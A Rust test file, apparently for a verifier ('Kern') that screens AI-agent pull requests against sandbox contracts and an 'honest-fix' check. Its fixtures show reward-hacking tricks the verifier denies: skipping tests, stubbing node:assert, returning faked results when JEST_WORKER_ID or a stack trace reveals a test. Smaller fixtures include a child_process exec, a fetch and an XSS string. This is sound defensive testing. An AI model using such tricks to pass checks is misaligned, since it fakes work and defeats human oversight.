    let manifests = files(&[("package.json", "{\"name\":\"x\"}\n"), ("package-lock.json", "{\"lockfileVersion\":3}\n"), ("src/a.js", "1\n")]);
    let key = DepsCache::key(&manifests, "registry.npmjs.org", "sha256:aa").unwrap();
    let mut edited_code = manifests.clone();
    edited_code.insert("src/a.js".into(), file("2\n"));
    assert_eq!(key, DepsCache::key(&edited_code, "registry.npmjs.org", "sha256:aa").unwrap(), "only the manifests decide what gets installed");
    let mut other_lock = manifests.clone();
    other_lock.insert("package-lock.json".into(), file("{\"lockfileVersion\":3,\"packages\":{}}\n"));
    let mut other_manifest = manifests.clone();
    other_manifest.insert("package.json".into(), file("{\"name\":\"y\"}\n"));
    for other in [DepsCache::key(&other_lock, "registry.npmjs.org", "sha256:aa"), DepsCache::key(&other_manifest, "registry.npmjs.org", "sha256:aa"),
                  DepsCache::key(&manifests, "registry.example.com", "sha256:aa"), DepsCache::key(&manifests, "registry.npmjs.org", "sha256:bb")] {
        assert_ne!(other.unwrap(), key);
    }
    let record = json!({ "sha256": "a".repeat(64), "entries": 3, "bytes": 10, "lockfile": { "packages": 1 } });
    assert!(cache.get(&key).is_none());
    assert!(cache.put(&key, "kern-deps-one", &record).unwrap());
    assert_eq!(cache.get(&key), Some(("kern-deps-one".to_string(), record.clone())));
    assert!(!cache.put(&key, "kern-deps-two", &record).unwrap(), "the first install stays the cached one");
    std::fs::write(t.join("cache").join(format!("{}.json", "b".repeat(64))), "{\"volume\":\"/etc\",\"record\":{}}").unwrap();
    assert!(cache.get(&"b".repeat(64)).is_none());
    assert!(cache.get("../escape").is_none());
    std::fs::write(t.join("cache").join(format!("{}.json", "e".repeat(64))), json!({ "volume": "kern-deps-old", "record": record, "created_ns": 1 }).to_string()).unwrap();
    assert!(cache.get(&"e".repeat(64)).is_none());
    assert_eq!(serde_json::from_slice::<Value>(&std::fs::read(t.join("cache").join(format!("{key}.json"))).unwrap()).unwrap()["layout"], 2);
    let (k2, k3) = ("c".repeat(64), "d".repeat(64));
    cache.put(&k2, "kern-deps-c", &record).unwrap();
    cache.put(&k3, "kern-deps-d", &record).unwrap();
    assert_eq!(cache.evict(), vec!["kern-deps-old".to_string(), "kern-deps-one".to_string()]);
    assert!(cache.get(&key).is_none() && cache.get(&k3).is_some());
    cache.forget(&k3);
    assert!(cache.get(&k3).is_none() && cache.put(&k3, "kern-deps-e", &record).unwrap());
    assert_eq!(cache.get(&k3).map(|e| e.0), Some("kern-deps-e".to_string()));
}

#[test]
fn a_gate_lets_only_so_many_sandboxes_run_at_once() {
    use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
    let gate = kern::util::Gate::new(2);
    let (now, most) = (AtomicUsize::new(0), AtomicUsize::new(0));
    std::thread::scope(|s| {
        for _ in 0..6 {
            s.spawn(|| gate.run(|| {
                let n = now.fetch_add(1, SeqCst) + 1;
                most.fetch_max(n, SeqCst);
                std::thread::sleep(std::time::Duration::from_millis(30));
                now.fetch_sub(1, SeqCst);
            }));
        }
    });
    assert_eq!(most.load(SeqCst), 2);
}

#[test]
fn the_action_builds_kern_from_its_own_source_never_inside_the_pull_request() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let action = std::fs::read_to_string(root.join("action.yml")).unwrap();
    let install = action.split("- name: Install Kern").nth(1).unwrap().split("- name:").next().unwrap();
    assert!(install.contains("id: install") && install.contains("working-directory: ${{ github.action_path }}"), "{install}");
    let verify = action.split("- name: Verify the agent change").nth(1).unwrap();
    assert!(verify.contains("KERN_BIN: ${{ steps.install.outputs.bin }}"), "the verify step runs the binary the install step made: {verify}");
    let script = std::fs::read_to_string(root.join("scripts/install-kern.sh")).unwrap();
    assert!(script.contains("bin=") && script.contains(">> \"$GITHUB_OUTPUT\""), "{script}");
}

#[test]
fn init_sets_up_a_repository_from_a_verifier_profile_in_one_command() {
    let t = Temp::new();
    let repo = t.join("widget");
    sh(&t.0, &["init", "-q", "widget"]);
    sh(&repo, &["remote", "add", "origin", "https://github.com/acme/widget.git"]);
    for (p, c) in [("src/add.js", "module.exports = (a, b) => a + b;\n"), ("test/add.test.js", "require('node:assert');\n"), ("index.js", "module.exports = require('./src/add');\n"),
        ("jest.config.js", "module.exports = {};\n"), ("README.md", "# widget\n"), ("package.json", "{\"scripts\":{\"test\":\"mocha\"},\"devDependencies\":{\"mocha\":\"^10.0.0\"}}\n"), ("package-lock.json", "{\"lockfileVersion\":3,\"packages\":{}}\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let public = attest::keypair().unwrap().1;
    std::fs::write(t.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(t.join("verifier.pub"), &public).unwrap();
    let profile = kern::init::profile(&read_json(t.join("operator.json")).unwrap(), &public).unwrap();
    std::fs::write(t.join("profile.json"), profile.to_string()).unwrap();
    let r = kern::init::init(&repo, &kern::init::load_profile(t.join("profile.json").to_str().unwrap()).unwrap(), "agent", "acme/kern@0123456789abcdef0123456789abcdef01234567").unwrap();
    assert_eq!(r["status"], "INITIALIZED", "{r}");
    let c = contract(&read_json(repo.join(".github/kern/tasks/agent.json")).unwrap()).unwrap();
    assert_eq!((c.read.clone(), c.write.clone()), (vec!["README.md".to_string(), "index.js".into(), "src/".into(), "test/".into()], vec!["README.md".to_string(), "index.js".into(), "src/".into(), "test/".into()]));
    assert!(c.dependencies && c.checks == vec!["addition".to_string()]);
    assert!(c.compare && c.delta.is_none() && c.app.is_none(), "every change is compared with the old code; the task states its change when it has one");
    let up = contract(&read_json(repo.join(".github/kern/tasks/upgrade.json")).unwrap()).unwrap();
    assert!(up.approved == ["*"] && up.write.is_empty() && up.delta.as_ref().is_some_and(|d| d.changes.is_empty()), "{:?}", up.value);
    assert_eq!(up.tests.as_ref().map(|t| t.kind), Some(policy::Kind::Refactor), "an upgrade keeps every test passing and needs no new one");
    let tests = c.tests.clone().expect("a test runner was found, so the contract keeps the tests honest");
    assert_eq!((tests.paths, tests.kind, tests.runner, tests.command), (vec!["test/".to_string()], policy::Kind::Feature, policy::Runner::Mocha, vec!["/workspace/node_modules/.bin/mocha".to_string()]));
    assert!(required_checks(&c).contains(&"honest-fix".to_string()));
    let op = operator(&read_json(repo.join(".github/kern/operator.json")).unwrap()).unwrap();
    assert_eq!(op.repository, "acme/widget");
    assert_eq!(std::fs::read_to_string(repo.join(".github/kern/verifier.pub")).unwrap(), public);
    let workflow = std::fs::read_to_string(repo.join(".github/workflows/kern-verified.yml")).unwrap();
    assert!(workflow.contains("uses: acme/kern@0123456789abcdef0123456789abcdef01234567") && workflow.contains("pull_request_target"));
    assert!(workflow.contains("pull-requests: write") && workflow.contains("agent-mention:") && workflow.contains("max-attempts:"), "{workflow}");
    for want in ["contents: write", "checks: write", "verifier-url: ${{ vars.KERN_VERIFIER_URL }}", "verifier-token: ${{ secrets.KERN_VERIFIER_TOKEN }}", "group: kern-verified-${{ github.event.pull_request.number || github.event.merge_group.head_ref }}", "cancel-in-progress: false",
        "merge_group:
    types: [checks_requested]"] {
        assert!(workflow.contains(want), "{want}: {workflow}");
    }
    assert!(workflow.contains("if: (startsWith(github.event.pull_request.head.ref, 'kern/') || startsWith(github.event.pull_request.head.ref, 'renovate/') || startsWith(github.event.pull_request.head.ref, 'dependabot/')) && github.event.pull_request.head.repo.full_name == github.repository"),
        "only same-repository agent and upgrade branches are checked out, so ordinary and fork pull requests are skipped instead of failing: {workflow}");
    assert_eq!(read_json(repo.join(".github/kern/ruleset.json")).unwrap()["rules"][0]["parameters"]["strict_required_status_checks_policy"], true, "a pull request must be up to date with its base");
    assert!(r["next_steps"].as_array().unwrap().iter().any(|s| s.as_str().unwrap().contains("audit-merges")), "{r}");
    let ruleset = read_json(repo.join(".github/kern/ruleset.json")).unwrap();
    assert_eq!(ruleset["rules"][0]["parameters"]["required_status_checks"][0], json!({ "context": "kern-verified", "integration_id": 15368 }));
    denied(kern::init::init(&repo, &profile, "agent", "acme/kern@0123456789abcdef0123456789abcdef01234567"), "already");
    std::fs::remove_dir_all(repo.join(".github")).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).current_dir(&t.0).args(["init", "widget", "profile.json", "acme/kern@0123456789abcdef0123456789abcdef01234567", "second"]).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let plain = t.join("plain");
    sh(&t.0, &["init", "-q", "plain"]);
    sh(&plain, &["remote", "add", "origin", "https://github.com/acme/plain.git"]);
    for (p, c) in [("src/a.js", "module.exports = 1;\n"), ("test/a.js", "require('node:assert');\n"), ("package.json", "{}\n")] {
        std::fs::create_dir_all(plain.join(p).parent().unwrap()).unwrap();
        std::fs::write(plain.join(p), c).unwrap();
    }
    sh(&plain, &["add", "-A"]);
    sh(&plain, &["commit", "-qm", "base"]);
    let r = kern::init::init(&plain, &profile, "agent", "acme/kern@0123456789abcdef0123456789abcdef01234567").unwrap();
    assert!(contract(&read_json(plain.join(".github/kern/tasks/agent.json")).unwrap()).unwrap().tests.is_none());
    assert!(!plain.join(".github/kern/tasks/upgrade.json").exists(), "without a lockfile there is nothing to upgrade");
    assert!(r["next_steps"].as_array().unwrap().iter().any(|s| s.as_str().unwrap().contains("\"tests\"")), "{r}");
}

#[test]
fn init_grants_the_folders_people_edit_and_keeps_config_generated_and_agent_files_out() {
    let repo = files(&[("app/page.tsx", "export default 1;\n"), ("components/Button.tsx", "export const B = 1;\n"), ("hooks/use.ts", "export {};\n"), ("lib/db.ts", "export {};\n"),
        ("public/index.html", "<p></p>\n"), ("styles/globals.css", "p {}\n"), ("scripts/seed.js", "1;\n"), ("supabase/functions/x.ts", "export {};\n"), ("docs/guide.md", "x\n"),
        ("assets/logo.png", "png"), ("dist/bundle.js", "1;\n"), ("build/x.js", "1;\n"), ("coverage/lcov.info", "x\n"), ("vendor/lib.js", "1;\n"), (".vscode/settings.json", "{}\n"),
        (".github/workflows/ci.yml", "x\n"), ("README.md", "x\n"), ("CHANGELOG.md", "x\n"), ("AUTHORS", "x\n"), ("Makefile", "x\n"), ("index.html", "<p></p>\n"), ("styles.css", "p {}\n"), ("CLAUDE.md", "x\n"), ("AGENTS.md", "x\n"),
        ("next.config.js", "module.exports = {};\n"), ("tsconfig.json", "{}\n"), ("vercel.json", "{}\n"), (".env.example", "X=1\n"), ("package.json", "{}\n"), ("package-lock.json", "{\"lockfileVersion\":3,\"packages\":{}}\n")]);
    let (c, _) = kern::init::draft(&repo, Some(b"{}"), "agent", vec![json!("smoke")]).unwrap();
    assert_eq!(c.write, ["AUTHORS", "CHANGELOG.md", "README.md", "app/", "components/", "docs/", "hooks/", "index.html", "lib/", "public/", "scripts/", "styles.css", "styles/", "supabase/"]);
    assert_eq!(c.read, c.write);
    assert_eq!((c.limits.files_changed, c.limits.lines_changed), (40, 4000));
    let sized = |mib: usize| -> Files { (0..mib).map(|i| (format!("src/f{i}.js"), Entry { mode: "100644".into(), oid: "a".repeat(40), size: 1048576, bytes: None })).collect() };
    let (c, _) = kern::init::draft(&sized(40), None, "agent", vec![json!("smoke")]).unwrap();
    assert_eq!(c.limits.total_bytes, 64 << 20);
    denied(kern::init::draft(&sized(65), None, "agent", vec![json!("smoke")]), "Kern supports up to 67108864");
    let flat: Files = (0..120).map(|i| (format!("Screen{i}.jsx"), file("export default 1;\n"))).collect();
    assert_eq!(kern::init::draft(&flat, None, "agent", vec![json!("smoke")]).unwrap().0.write.len(), 120);
    denied(kern::init::draft(&files(&[("assets/logo.png", "png"), (".github/workflows/ci.yml", "x\n")]), None, "agent", vec![json!("smoke")]), "write the task contract by hand");
}

#[test]
fn audit_log_chains_every_decision_and_the_report_escapes_agent_text() {
    let t = Temp::new();
    let log = t.join("audit.jsonl");
    kern::audit::append(&log, &json!({ "command": "run", "status": "VERIFIED", "task": "fix-addition", "commit": "a".repeat(40) })).unwrap();
    kern::audit::append(&log, &json!({ "command": "check-pr", "status": "DENIED", "reason": "Patch widens module capabilities: src/<script>alert(1)</script>.js +[global:fetch]" })).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).args(["gate-artifact", "x", "y", "z", "w"]).env("KERN_AUDIT_LOG", &log).output().unwrap();
    assert!(!out.status.success());
    let intact = kern::audit::verify(&log).unwrap();
    assert_eq!(intact["entries"], 3);
    let last: Value = serde_json::from_str(std::fs::read_to_string(&log).unwrap().lines().last().unwrap()).unwrap();
    assert_eq!((last["event"]["command"].as_str(), last["event"]["status"].as_str()), (Some("gate-artifact"), Some("DENIED")));
    let html = kern::audit::report(&log).unwrap();
    assert!(html.contains("&lt;script&gt;") && !html.contains("<script>alert"), "agent-controlled text must be escaped");
    assert!(html.contains("Patch widens module capabilities") && html.contains("fix-addition"));
    let text = std::fs::read_to_string(&log).unwrap();
    std::fs::write(&log, text.replacen("VERIFIED", "BLOCKED", 1)).unwrap();
    denied(kern::audit::verify(&log), "line 2");
}

#[test]
fn block_messages_say_why_and_how_to_allow() {
    let f = fixture();
    let mut c = f.candidate.clone();
    c.insert("README.md".into(), file("x"));
    denied(git::changes(&f.original, &c, &f.policy), "add \"README.md\" to filesystem.read and filesystem.write");
    let mut tight = policy_value();
    tight["limits"]["lines_changed"] = json!(1);
    denied(git::changes(&f.original, &f.candidate, &contract(&tight).unwrap()), "1 file and more than 1 line changed; the contract allows 8 files and 1 lines");
    let mut c = f.candidate.clone();
    c.insert("src/run.js".into(), file("require('child_process').exec('id');\n"));
    c.insert("index.js".into(), file("fetch('https://x.invalid');\n"));
    let mut wide = policy_value();
    wide["filesystem"] = json!({ "read": ["README.md", "index.js", "src/", "test/"], "write": ["index.js", "src/", "test/"] });
    let changed = git::changes(&f.original, &c, &contract(&wide).unwrap()).unwrap();
    denied(capability::check(&f.original, &c, &changed, &std::collections::BTreeMap::new()), r#"allow it in operator.json: "permissions": {"index.js":["global:fetch"],"src/":["node:child_process"]}"#);
}

#[test]
fn contracts_parse_strictly_and_only_attenuate() {
    let p = policy_value();
    contract(&p).unwrap();
    for (mutate, needle) in [
        (Box::new(|v: &mut Value| v["network"] = json!(["0.0.0.0/0"])) as Box<dyn Fn(&mut Value)>, "no network"), (Box::new(|v: &mut Value| v["secrets"] = json!(["AWS"])), "no secrets"),
        (Box::new(|v: &mut Value| v["publish"] = json!(true)), "publication"), (Box::new(|v: &mut Value| v["extra"] = json!(1)), "unknown"),
        (Box::new(|v: &mut Value| v["filesystem"]["write"] = json!(["lib/"])), "requires read"), (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["../etc", "src/", "test/"])), "Nonportable"),
        (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["node_modules/", "src/", "test/"])), "not grantable"), (Box::new(|v: &mut Value| v["limits"]["memory_mb"] = json!(999999)), "memory_mb"),
        (Box::new(|v: &mut Value| v["dependencies"] = json!({ "manager": "pip", "lockfile": "x" })), "npm"),
    ] {
        let mut v = p.clone();
        mutate(&mut v);
        denied(contract(&v), needle);
    }
    let mut wider = p.clone();
    wider["filesystem"]["write"] = json!(["src/", "test/", "README.md/"]);
    assert!(attenuate(&p, &wider).is_err());
    let mut fewer = p.clone();
    fewer["required_checks"] = json!(["other"]);
    denied(attenuate(&p, &fewer), "remove a required check");
    let mut deps = p.clone();
    deps["dependencies"] = json!({ "manager": "npm", "lockfile": "package-lock.json" });
    denied(attenuate(&p, &deps), "dependency");
    let mut narrower = p.clone();
    narrower["filesystem"]["write"] = json!(["src/"]);
    narrower["limits"]["timeout_seconds"] = json!(10);
    assert_eq!(attenuate(&p, &narrower).unwrap().write, vec!["src/".to_string()]);
}
fn tested(kind: &str) -> Value {
    let mut v = policy_value();
    v["version"] = json!(4);
    v["behaviors"] = json!([]);
    v["tests"] = json!({ "paths": ["test/"], "kind": kind, "runner": "node", "command": ["/usr/local/bin/node", "--test"] });
    v
}
#[test]
fn contracts_can_require_a_proof_of_honest_fix() {
    let c = contract(&tested("bugfix")).unwrap();
    let t = c.tests.clone().unwrap();
    assert_eq!((t.paths.clone(), t.kind, t.runner, t.command[0].as_str()), (vec!["test/".to_string()], policy::Kind::Bugfix, policy::Runner::Node, "/usr/local/bin/node"));
    assert!(required_checks(&c).contains(&"honest-fix".to_string()));
    assert!(!required_checks(&contract(&policy_value()).unwrap()).contains(&"honest-fix".to_string()));
    let mut none = tested("bugfix");
    none["tests"] = Value::Null;
    assert!(contract(&none).unwrap().tests.is_none());
    for (key, value, needle) in [
        ("kind", json!("hotfix"), "kind"), ("command", json!(["node", "--test"]), "absolute"), ("paths", json!(["docs/"]), "tests.paths"),
        ("paths", json!(["test/", "test/unit/"]), "Overlapping"), ("paths", json!([]), "tests.paths"), ("runner", json!("ava"), "tests.runner"),
        ("command", json!(["/usr/local/bin/node", "test/"]), "--test"), ("command", json!(["/usr/local/bin/node", "--test", "--test-reporter=spec"]), "reporter"),
    ] {
        let mut bad = tested("bugfix");
        bad["tests"][key] = value;
        denied(contract(&bad), needle);
    }
    let mut unnamed = tested("bugfix");
    unnamed["tests"].as_object_mut().unwrap().remove("runner");
    denied(contract(&unnamed), "missing or unknown fields");
    assert_eq!((t.edits, c.value["tests"]["edits"].as_str()), (policy::Edits::Checked, Some("checked")));
    let mut locked_edits = tested("bugfix");
    locked_edits["tests"]["edits"] = json!("locked");
    assert_eq!(contract(&locked_edits).unwrap().tests.unwrap().edits, policy::Edits::Locked);
    assert_ne!(contract_digest(&contract(&locked_edits).unwrap()).unwrap(), contract_digest(&c).unwrap());
    let mut explicit = tested("bugfix");
    explicit["tests"]["edits"] = json!("checked");
    assert_eq!(contract_digest(&contract(&explicit).unwrap()).unwrap(), contract_digest(&c).unwrap());
    locked_edits["tests"]["edits"] = json!("sometimes");
    denied(contract(&locked_edits), "tests.edits");
    assert_eq!(contract(&tested("change")).unwrap().tests.unwrap().kind, policy::Kind::Change);
    let with = |runner: &str, command: Value| { let mut v = tested("bugfix"); v["tests"]["runner"] = json!(runner); v["tests"]["command"] = command; contract(&v) };
    denied(with("vitest", json!(["/workspace/node_modules/.bin/vitest"])), "vitest run");
    for flags in [vec!["--reporter", "dot"], vec!["-R", "dot"], vec!["--reporter=spec"]] {
        denied(with("mocha", json!(std::iter::once("/workspace/node_modules/.bin/mocha").chain(flags).collect::<Vec<_>>())), "reporter");
    }
    denied(with("jest", json!(["/workspace/node_modules/.bin/jest", "--json"])), "reporter");
    denied(with("jest", json!(["/workspace/node_modules/.bin/jest", "--outputFile=x.json"])), "reporter");
    denied(with("jest", json!(["/workspace/node_modules/.bin/jest", "--testResultsProcessor=./mine.js"])), "reporter");
    for (runner, command, want) in [
        ("node", json!(["/usr/local/bin/node", "--test", "test/"]), vec!["/usr/local/bin/node", "--test", "--test-reporter=/kern/node-report.mjs", "test/"]),
        ("mocha", json!(["/workspace/node_modules/.bin/mocha", "--recursive"]), vec!["/workspace/node_modules/.bin/mocha", "--recursive", "--reporter", "json"]),
        ("jest", json!(["/workspace/node_modules/.bin/jest"]), vec!["/workspace/node_modules/.bin/jest", "--ci", "--testResultsProcessor=/kern/jest-report.cjs"]),
        ("vitest", json!(["/workspace/node_modules/.bin/vitest", "run"]), vec!["/workspace/node_modules/.bin/vitest", "run", "--reporter=json", "--no-cache"]),
    ] {
        assert_eq!(kern::proof::command(with(runner, command).unwrap().tests.as_ref().unwrap()), want);
    }
    let mut locked = tested("bugfix");
    locked["filesystem"]["write"] = json!(["src/"]);
    denied(contract(&locked), "add a test");
    locked["tests"]["kind"] = json!("refactor");
    contract(&locked).unwrap();
    let mut v3 = tested("bugfix");
    v3["version"] = json!(3);
    denied(contract(&v3), "missing or unknown fields");
    let mut v4 = tested("bugfix");
    v4.as_object_mut().unwrap().remove("tests");
    denied(contract(&v4), "missing or unknown fields");
    denied(attenuate(&tested("bugfix"), &tested("feature")), "test proof");
    denied(attenuate(&tested("bugfix"), &none), "test proof");
    attenuate(&none, &tested("bugfix")).unwrap();
    let mut op = operator_value(&["external"]);
    op["checks"][0]["id"] = json!("honest-fix");
    denied(operator(&op), "reserved");
}

const ADD_TEST: &str = "import { test } from 'node:test';\nimport assert from 'node:assert';\nimport { add } from '../src/add.mjs';\ntest('adds', () => assert.equal(add(1, 2), 3));\n";
fn honest_base() -> Files {
    files(&[("src/add.mjs", "export const add = (a, b) => a - b;\n"), ("test/add.test.mjs", ADD_TEST), ("test/fixtures/data.json", "{}\n"), ("README.md", "x\n")])
}
fn honest_change(changes: &[(&str, Option<&str>)]) -> Files {
    let mut candidate = honest_base();
    for (path, text) in changes {
        match text { Some(t) => { candidate.insert(path.to_string(), file(t)); } None => { candidate.remove(*path); } }
    }
    candidate
}
const FIX: (&str, Option<&str>) = ("src/add.mjs", Some("export const add = (a, b) => a + b;\n"));
const REGRESSION: (&str, Option<&str>) = ("test/regression.test.mjs", Some("import { test } from 'node:test';\nimport assert from 'node:assert';\nimport { add } from '../src/add.mjs';\ntest('adds 2 + 2', () => assert.equal(add(2, 2), 4));\n"));
fn screened(kind: &str, changes: &[(&str, Option<&str>)]) -> R<Value> { git::changes(&honest_base(), &honest_change(changes), &contract(&tested(kind)).unwrap()) }

#[test]
fn honest_fix_contracts_lock_existing_tests_and_refuse_tricks() {
    let ok = screened("bugfix", &[FIX, REGRESSION]).unwrap();
    assert_eq!((ok["tests"]["new_test_files"].clone(), ok["tests"]["existing_test_files"].as_u64(), ok["tests"]["runner"].as_str()), (json!(["test/regression.test.mjs"]), Some(2), Some("node")));
    let edited = screened("refactor", &[FIX, ("test/add.test.mjs", Some("// gutted\n")), ("test/fixtures/data.json", None)]).unwrap();
    assert_eq!((edited["tests"]["changed_test_files"].clone(), edited["tests"]["deleted_test_files"].clone()), (json!(["test/add.test.mjs"]), json!(["test/fixtures/data.json"])));
    let extended = format!("{ADD_TEST}test('adds 2 + 2', () => assert.equal(add(2, 2), 4));\n");
    screened("bugfix", &[FIX, ("test/add.test.mjs", Some(&extended))]).unwrap();
    let mut locked = tested("bugfix");
    locked["tests"]["edits"] = json!("locked");
    let strict = |changes: &[(&str, Option<&str>)]| git::changes(&honest_base(), &honest_change(changes), &contract(&locked).unwrap());
    denied(strict(&[FIX, ("test/add.test.mjs", Some(&extended))]), "Existing test file changed");
    denied(strict(&[FIX, REGRESSION, ("test/add.test.mjs", None)]), "Existing test file deleted");
    denied(strict(&[FIX, REGRESSION, ("test/fixtures/data.json", Some("{\"x\": 1}\n"))]), "Existing test file changed");
    denied(screened("bugfix", &[FIX]), "must add a test");
    denied(screened("bugfix", &[FIX, ("test/helpers/build.mjs", Some("export const x = 1;\n"))]), "must add a test");
    screened("refactor", &[FIX]).unwrap();
    denied(screened("refactor", &[FIX, ("test/add.test.mjs", Some(&ADD_TEST.replace("test('adds'", "test.skip('adds'")))]), "test.skip");
    for (code, marker) in [
        ("test.only('x', () => {});", "test.only"), ("describe.skip('x', () => {});", "describe.skip"), ("it.todo('x');", "it.todo"),
        ("xit('x', () => {});", "xit"), ("fdescribe('x', () => {});", "fdescribe"), ("test('x', { skip: true }, () => {});", "the skip option"),
        ("test('x', { only: 1 }, () => {});", "the only option"), ("const only = describe['only'];\nonly('x', () => {});", "describe.only"), ("describe[`skip`]('x', () => {});", "describe.skip"),
    ] {
        let body = format!("import {{ test, describe, it }} from 'node:test';\n{code}\n");
        denied(screened("feature", &[FIX, ("test/new.test.mjs", Some(&body))]), &format!("test/new.test.mjs uses {marker}"));
    }
    for code in ["test('x', (t) => { if (process.platform === 'win32') t.skip(); });", "class Store { skip() {} }\nnew Store().skip();", "process.on('exit', () => {});", "test('x', { skip: false }, () => {});"] {
        let body = format!("import {{ test }} from 'node:test';\n{code}\n");
        screened("feature", &[FIX, ("test/new.test.mjs", Some(&body))]).unwrap();
    }
    screened("feature", &[FIX, ("test/fixtures/more.json", Some("{}\n")), ("test/helpers/build.mjs", Some("export const x = 1;\n"))]).unwrap();
    for (path, code, marker) in [
        ("src/add.mjs", "export const add = (a, b) => a + b;\nit.only('x', () => {});\n", "the test global it"),
        ("src/add.mjs", "export const add = (a, b) => (typeof describe === 'function' ? 4 : a + b);\n", "the test global describe"),
        ("src/add.mjs", "globalThis.expect = () => ({ toBe() {} });\nexport const add = (a, b) => a + b;\n", "globalThis.expect"),
        ("src/add.mjs", "import assert from 'node:assert';\nassert.strictEqual = () => {};\nexport const add = (a, b) => a + b;\n", "a change to node:assert"),
        ("src/add.mjs", "import * as a from 'assert';\nObject.assign(a.default, { equal() {} });\nexport const add = (x, y) => x + y;\n", "a change to assert"),
        ("src/patch.cjs", "require('assert').equal = () => {};\n", "a change to assert"),
        ("src/patch.cjs", "const a = require('node:assert/strict');\nReflect.set(a, 'equal', () => {});\n", "a change to node:assert/strict"),
        ("src/add.mjs", "export const add = (a, b) => (process.env.JEST_WORKER_ID ? 4 : a + b);\n", "JEST_WORKER_ID"),
        ("src/add.mjs", "export const add = (a, b) => (process.env['VITEST'] ? 4 : a + b);\n", "VITEST"),
        ("src/add.mjs", "export const add = (a, b) => (new Error().stack.includes('regression') ? 4 : a + b);\n", "new Error().stack"),
        ("src/add.mjs", "export const add = (a, b) => (Error('x').stack.includes('regression') ? 4 : a + b);\n", "new Error().stack"),
        ("src/patch.cjs", "function add(a, b) { return add.caller && add.caller.name === 'regression' ? 4 : a + b; }\nmodule.exports = add;\n", ".caller"),
        ("src/patch.cjs", "function add(a, b) { return arguments.callee.length + a + b; }\nmodule.exports = add;\n", ".callee"),
        ("src/add.mjs", "Error.prepareStackTrace = (e, frames) => frames;\nexport const add = (a, b) => a + b;\n", "Error.prepareStackTrace"),
        ("src/add.mjs", "const here = {};\nError.captureStackTrace(here);\nexport const add = (a, b) => a + b;\n", "Error.captureStackTrace"),
    ] {
        denied(screened("feature", &[(path, Some(code))]), marker);
    }
    screened("feature", &[("src/add.mjs", Some("export const add = (a, b) => { for (const it of [a, b]) it.toString(); return a + b; };\n"))]).unwrap();
    screened("feature", &[("src/add.mjs", Some("export const add = (a, b) => { try { return a + b; } catch (e) { console.error(e.stack); throw e; } };\n"))]).unwrap();
    let mut before = honest_base();
    before.insert("src/env.mjs".into(), file("export const worker = process.env.JEST_WORKER_ID;\n"));
    let mut after = before.clone();
    after.insert("src/env.mjs".into(), file("export const worker = process.env.JEST_WORKER_ID || '1';\n"));
    git::changes(&before, &after, &contract(&tested("feature")).unwrap()).unwrap();
    for config in ["test/.mocharc.json", "test/mocha.opts", "test/jest.config.js", "test/vitest.config.mts", "src/setupTests.js", "test/vite.config.ts", "src/.babelrc", "test/babel.config.cjs", "test/jest.setup.js"] {
        denied(screened("feature", &[FIX, (config, Some("{}\n"))]), "Test runner configuration");
    }
}

fn report_fixture(name: &str) -> Vec<u8> { std::fs::read(Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/reports").join(name)).unwrap() }
#[test]
fn runner_reports_are_read_test_by_test() {
    use kern::policy::Runner;
    use kern::proof::{Count, read_report};
    let c = |passed: u32, failed: u32, skipped: u32| Count { passed, failed, skipped };
    let tests = |items: &[(&str, Count)]| items.iter().map(|(k, v)| (k.to_string(), *v)).collect::<std::collections::BTreeMap<_, _>>();
    let m = read_report(Runner::Mocha, &report_fixture("mocha10.json")).unwrap();
    assert_eq!(m.tests, tests(&[("test/console.test.js > logs", c(1, 0, 0)), ("test/math.test.js > math adds", c(1, 0, 0)), ("test/math.test.js > math fails", c(0, 1, 0)),
        ("test/math.test.js > math pending", c(0, 0, 1)), ("test/math.test.js > math skipped", c(0, 0, 1))]));
    assert!(m.problems.is_empty());
    assert_eq!(read_report(Runner::Mocha, &report_fixture("mocha5.json")).unwrap().tests.keys().map(String::as_str).collect::<Vec<_>>(), ["logs", "math adds", "math fails", "math pending", "math skipped"]);
    let j = read_report(Runner::Jest, &report_fixture("jest.json")).unwrap();
    assert_eq!(j.tests, tests(&[("test/math.jest.test.js > math > adds", c(1, 0, 0)), ("test/math.jest.test.js > math > fails", c(0, 1, 0)),
        ("test/math.jest.test.js > math > later", c(0, 0, 1)), ("test/math.jest.test.js > math > skipped", c(0, 0, 1))]));
    assert_eq!(j.problems, vec!["test/broken.test.js".to_string()]);
    let p = read_report(Runner::Jest, &report_fixture("jest-processor.out")).unwrap();
    assert_eq!((p.tests, p.problems), (j.tests.clone(), j.problems.clone()));
    let v = read_report(Runner::Vitest, &report_fixture("vitest.json")).unwrap();
    assert_eq!(v.tests, tests(&[("test/math.vitest.test.mjs > math > adds", c(1, 0, 0)), ("test/math.vitest.test.mjs > math > fails", c(0, 1, 0)),
        ("test/math.vitest.test.mjs > math > later", c(0, 0, 1)), ("test/math.vitest.test.mjs > math > skipped", c(0, 0, 1))]));
    let n = read_report(Runner::Node, &report_fixture("node.tap")).unwrap();
    assert_eq!(n.tests, tests(&[("adds", c(1, 0, 0)), ("fails", c(0, 1, 0)), ("group > inner", c(1, 0, 0)), ("later", c(0, 0, 1)), ("skipped", c(0, 0, 1))]));
    let broken = read_report(Runner::Node, &report_fixture("node-broken.tap")).unwrap();
    assert_eq!((broken.tests.get("test/broken.test.js"), broken.problems), (None, vec!["test/broken.test.js".to_string()]), "a test file that does not load is a problem of that file, not a failing test");
    let text = |name: &str| String::from_utf8(report_fixture(name)).unwrap();
    let (mocha, jest, tap, processed) = (text("mocha10.json"), text("jest.json"), text("node.tap"), text("jest-processor.out"));
    for (runner, out, why) in [
        (Runner::Mocha, String::new(), "no mocha report"), (Runner::Mocha, mocha[..mocha.len() / 2].to_string(), "no mocha report"), (Runner::Mocha, format!("{mocha}\n{mocha}"), "more than one"),
